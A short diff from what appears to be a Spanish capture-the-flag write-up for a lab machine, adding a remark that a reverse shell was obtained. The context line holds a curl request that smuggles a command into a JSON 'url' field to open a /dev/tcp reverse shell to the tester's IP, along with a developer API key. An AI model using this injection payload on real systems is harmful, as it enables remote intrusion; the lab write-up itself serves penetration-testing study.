@@ -420,3 +420,6 @@ Sin embargo, parece que la máquina no tiene el comando bash, por lo que intenta
 curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"https://4xura.com; sh -i >& /dev/tcp/10.10.14.73/9001 0>&1"}' | jq
 ```
 
+efectivamente podemos obtener una reverse shell
+![[Pasted image 20240718203643.png]]
+
